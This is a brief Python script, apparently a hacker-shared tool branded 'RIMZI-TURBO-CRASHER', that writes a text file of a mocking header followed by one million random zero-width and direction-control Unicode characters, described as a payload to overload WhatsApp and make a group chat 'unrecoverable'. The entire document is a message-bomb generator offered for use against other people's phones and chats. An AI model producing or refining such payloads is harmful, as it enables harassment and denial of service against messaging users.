# 💥 RIMZI-TURBO-CRASHER 💥
# ⚡ 1 Million Unicode Bomb (Fast Version)
# 👑 Code by Rimzi — for Cyber Kings

import random

def generate():
    header = (
        "💀 RIMZI-TURBO CRASH MESSAGE 💀\n"
        "🚫 Group is unrecoverable\n"
        "🔥 WhatsApp Engine Overload\n"
        "🧠 Do not try to scroll\n"
        "😈 Say goodbye to smooth chat\n"
        "💣 Payload begins below...\n\n"
    )

    chars = [
        '\u200B', '\u200C', '\u200D', '\u2063', '\u2060', '\u200E',
        '\u200F', '\u061C', '\u202A', '\u202B', '\u202C', '\u202D',
        '\u202E', '\u2061', '\u2062', '\uDBFF\uDFFF'
    ]

    print("[+] Creating Turbo Crash Message (1M chars)...")
    payload = header + ''.join(random.choices(chars, k=1000000))

    with open("rimzi_turbo_crash.txt", "w", encoding="utf-8") as f:
        f.write(payload)

    print("[✔] Done! File saved: rimzi_turbo_crash.txt")

generate()
